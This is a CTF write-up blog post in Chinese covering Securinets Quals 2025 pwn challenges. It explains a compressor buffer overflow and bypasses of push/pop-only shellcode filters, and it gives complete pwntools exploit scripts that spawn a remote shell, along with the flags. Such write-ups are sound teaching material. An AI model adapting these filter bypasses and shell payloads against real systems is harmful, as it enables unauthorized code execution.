---
title: "Write-ups: Securinets CTF Quals 2025"
published: 2025-10-04
updated: 2025-10-06
description: "Write-ups for Securinets CTF Quals 2025 pwn aspect."
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# zip++

## Information

- Category: Pwn
- Points: 500

## Description

> why isn't my compressor compressing ?!

## Write-up

问 AI，得知 `compress` 函数实现了一个 `RLE (Run-Length Encoding)` 压缩算法，压缩后格式为 `[字节 1][重复次数 1][字节 2][重复次数 2]...`，因此如果我们输入交替字符就会导致压缩率很差，溢出返回地址。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    flat,
    process,
    raw_input,
    remote,
)


FILE = "./main"
HOST, PORT = "pwn-14caf623.p1.securinets.tn", 9000

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    payload = flat(
        b"AB" * 0xC6,
        b"\xa6" * 0x11,
    )
    raw_input("DEBUG")
    target.sendafter(b"data to compress :", payload)
    raw_input("DEBUG")
    target.sendline(b"exit")

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`Securinets{my_zip_doesnt_zip}`]

# push pull pops

## Information

- Category: Pwn
- Points: 500

## Description

> Shellcoding in the big 25 😱

## Write-up

有意思，第一次见 python 写的 pwn 题，这题只允许使用 `push`, `pop` 和 `int 3` 指令，但是测试发现非法指令会导致 capstone 直接返回 `None`，使得后面的指令不会被检查。所以我们只要把 shellcode 写到非法指令后面即可。

祭出指令表：[X86 Opcode and Instruction Reference Home](http://ref.x86asm.net/coder64.html)

但是有个问题是，从 mmap 分配的地址开始执行，必定会碰到我们的非法指令，然后就会 abort 。这里的解决方法也很简单，因为我们可以操作栈，那么，我们只要把 `rsp` 变成 mmap 出来的地址，然后用 `pop` 先提高栈地址，然后再 `push` 降低栈地址的同时，也将栈上原先的指令覆盖掉了。用什么覆盖？当然是 `nop` 啦～

最后说一下怎么调试，我们只要知道这个 python 脚本的 `pid` 就可以用 `gdb -p <pid>` 挂载，只要知道 mmap 返回的地址就可以调试 shellcode，还有，善用 `int 3` 也很重要。

```python ins={14-17}
def run(code: bytes):
    # Allocate executable memory using mmap

    mem = mmap.mmap(
        -1, len(code), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC
    )
    mem.write(code)

    # Create function pointer and execute
    func = ctypes.CFUNCTYPE(ctypes.c_void_p)(
        ctypes.addressof(ctypes.c_char.from_buffer(mem))
    )

    print(
        f"pid is: {os.getpid()}\nmem: {hex(ctypes.addressof(ctypes.c_char.from_buffer(mem)))}"
    )
    input("DEBUG")
    func()

    exit(1)
```

## Exploit

```python
#!/usr/bin/env python3

import argparse

from pwn import (
    ELF,
    asm,
    b64e,
    context,
    flat,
    process,
    raw_input,
    remote,
    shellcraft,
)

parser = argparse.ArgumentParser()
parser.add_argument("-L", "--local", action="store_true", help="Run locally")
parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
args = parser.parse_args()


FILE = "./main.py"
HOST, PORT = "localhost", 1337

context(log_level="debug", terminal="kitty", arch="amd64")


def mangle(pos, ptr, shifted=1):
    if shifted:
        return pos ^ ptr
    return (pos >> 12) ^ ptr


def demangle(pos, ptr, shifted=1):
    if shifted:
        return mangle(pos, ptr)
    return mangle(pos, ptr, 0)


def launch(argv=None, envp=None):
    global target, thread

    if argv is None:
        argv = [FILE]

    if args.local and args.threads is not None:
        raise ValueError("Options -L and -T cannot be used together.")

    if args.local:
        if args.gdb and "qemu" in argv[0]:
            if "-g" not in argv:
                argv.insert(1, str(args.port))
                argv.insert(1, "-g")
        target = process(argv, env=envp)
    elif args.threads:
        if args.threads <= 0:
            raise ValueError("Thread count must be positive.")
        process(FILE)

        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
    else:
        target = remote(HOST, PORT, ssl=True)


def main():
    launch()

    payload = asm(
        """
        push r11
        pop rsp

        pop r15
        pop r15
        pop r15
        pop r15

        push r15
        push r15
        push r15
        """
    )

    payload += b"\x06" + asm(shellcraft.nop()) * 0xF
    payload += asm("add rsp, 0x100")
    payload += asm(shellcraft.sh())

    target.sendline(b64e(payload))

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`Securinets{push_pop_to_hero}`]

# push pull pops REVENGE

## Information

- Category: Pwn
- Points: 500

## Description

> you aint getting away with it , not on my watch .

## Write-up

这次题目加了输入和解码出来的指令之间的长度检测：

```python
if code_len != decoded:
    print("nice try")
    return False
```

那就把非法指令 ban 掉了，测试使用 semantically equivalent encodings 也没啥用，绕不开这个长度检测。

最后思路是自己构造一个 `syscall`，然后调用 `read`，这样就可以把 shellcode 读进去，不被过滤。

官方的 solution 也是构造 `read`，不过官方的 wp 里面，`syscall` 不是自己造的，而是利用内存中现成的，所以只要操作 `push`，`pop` 到对应内存就能拿到了。而我这里用的方法就复杂了点，<s>让我们假设内存空间非常贫瘠，寸草不生，根本没有残留的 `syscall`</s>，那能不能凭空造一个出来？

由于这题也是 mmap 了一块 `rwx` 的内存，所以只要我们的内存中有 `syscall` 的机器码，它就能执行到，我们只要在执行前提前布置好调用 `read` 用到的寄存器即可。

:::caution
由于这道题的特殊性，远程内存环境和本地肯定是大不相同的，因为我们不管是自己造 `syscall` 还是找现成的，都对内存环境布局有着极其严格的要求，所以这题必须在 docker 里跑，本地远程调试。
:::

首先解决一下调试的问题，我们将容器启动后自动执行的指令改一下，挂上 `gdbserver`，开放 `1234` 端口用于调试：

```dockerfile del={1} ins={2}
CMD socat TCP-LISTEN:5000,reuseaddr,fork EXEC:/app/run
CMD ["gdbserver", ":1234", "socat", "TCP-LISTEN:5000,reuseaddr,fork", "EXEC:/app/run"]
```

然后 `docker-compose.yml` 也需要改，开放一下调试端口：

```yaml ins={8}
version: "3.8"

services:
  vertical_tables:
    build: .
    ports:
      - "1304:5000"
      - "1234:1234"
    deploy:
      resources:
        limits:
          cpus: "1"
          memory: 1000M
    read_only: true
    cap_drop:
      - all
    privileged: true
```

现在只要运行 `docker compose up -d` 就把容器跑起来了，然后 exp 直接连接 `1304` 端口与题目交互。

既然要自己造 `syscall`，那肯定得先搞清楚这玩意儿的机器码是多少，可以这样：

```shellsession
λ ~/ pwn asm -c amd64 "syscall"
0f05
```

那我们只要想办法弄到 `\x0f` 和 `\x05` 就成功了一半。观察内存，发现有一个现成的 `\x05`：

<center>
  <img src="https://github.com/CuB3y0nd/picx-images-hosting/raw/master/.2rvmves3vy.avif" alt="" />
</center>

虽然也有现成的 `\x0f`，但是它行吗？我们可以做一个简单的测试，直接找一片空内存改，然后看看解析出来是什么指令：

<center>
  <img src="https://github.com/CuB3y0nd/picx-images-hosting/raw/master/.32igoksjy3.avif" alt="" />
</center>

并不是我们期望的 `syscall`，很简单，因为 `amd64` 是小端序的，所以我们不能写 `\x0f`，而是应该写 `0x0f00000000000000`。

<center>
  <img src="https://github.com/CuB3y0nd/picx-images-hosting/raw/master/.99tuor2zt2.avif" alt="" />
</center>

至于为啥必须这样？因为我的想法是找一个带 `\x0f` 的 `push` or `pop` 指令放在最后，然后用一堆单字节的 `push` or `pop` 将 `\x0f` 卡到第八个字节的位置，最后将事先获取到的 `\x05` 通过 `push` 覆盖掉前面被挤出来的字节，就有了一个 `syscall`。

<center>
  <img src="https://github.com/CuB3y0nd/picx-images-hosting/raw/master/.5triwpchiq.avif" alt="" />
</center>

但是我们怎么保证，这样弄到了 `syscall`，它就一定会执行呢？因为我们不可能跳回到前面 `syscall` 的地方去执行。这就得益于来自上一题的灵感了，因为如果是非法指令的话，CPU 会卡在那里不往下走，但是一旦我们将非法指令替换成了合法指令，它就又能继续往下跑了～

这里选的指令是 `pop fs`，实测 `push fs` 不行。

<center>
  <img src="https://github.com/CuB3y0nd/picx-images-hosting/raw/master/.7lkhrm6jvb.avif" alt="" />
</center>

所以我的 exp 就不难理解了，一开始的 `0x4d` 个 `pop r15` 是为了弄到 `\x05`，保存在 `r15` 里：

<center>
  <img src="https://github.com/CuB3y0nd/picx-images-hosting/raw/master/.6f16izwiop.avif" alt="" />
</center>

然后设置了调用 `read` 用到的几个寄存器，`rax` 不用管，本来就是 `0`，用它设置一下 `rdi`，然后利用内存中的残留值设置 `rdx`，`rsi` 可以最后栈迁移到 shellcode 的时候设置。

最后就是栈迁移回 shellcode，通过操作 `push`，`pop` 定位到要覆盖的指令处，最后将 `\x05` 填上去即可。

## Exploit

```python
#!/usr/bin/env python3

import argparse

from pwn import (
    ELF,
    asm,
    b64e,
    context,
    flat,
    process,
    raw_input,
    remote,
    shellcraft,
    sleep,
)

parser = argparse.ArgumentParser()
parser.add_argument("-L", "--local", action="store_true", help="Run locally")
parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
args = parser.parse_args()


FILE = "./main.py"
HOST, PORT = "localhost", 1304

context(log_level="debug", terminal="kitty", arch="amd64")


def mangle(pos, ptr, shifted=1):
    if shifted:
        return pos ^ ptr
    return (pos >> 12) ^ ptr


def demangle(pos, ptr, shifted=1):
    if shifted:
        return mangle(pos, ptr)
    return mangle(pos, ptr, 0)


def launch(argv=None, envp=None):
    global target, thread

    if argv is None:
        argv = [FILE]

    if args.local and args.threads is not None:
        raise ValueError("Options -L and -T cannot be used together.")

    if args.local:
        if args.gdb and "qemu" in argv[0]:
            if "-g" not in argv:
                argv.insert(1, str(args.port))
                argv.insert(1, "-g")
        target = process(argv, env=envp)
    elif args.threads:
        if args.threads <= 0:
            raise ValueError("Thread count must be positive.")
        process(FILE)

        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
    else:
        target = remote(HOST, PORT, ssl=False)


def main():
    launch()

    payload = asm("pop r15") * 0x4D
    payload += asm(
        """
        pop rsp
        pop r15

        push rax
        pop rdi
        """
    )
    payload += asm("pop rbx") * 0x14
    payload += asm("pop rdx")
    payload += asm("push rbx") * 0x1B
    payload += asm(
        """
        push r11
        pop rsi

        push r11
        pop rsp
        """
    )
    payload += asm("pop rbx") * 0x20
    payload += asm("push r15")
    payload += b"\x0f\xa1"

    target.sendline(b64e(payload))
    target.sendline()

    sc = asm(shellcraft.nop() * 0x150 + shellcraft.sh())
    sleep(1)
    target.sendline(sc)

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

复现。

# V-tables

## Information

- Category: Pwn
- Points: 500

## Description

> idk

## Write-up

## Exploit

## Flag

复现。
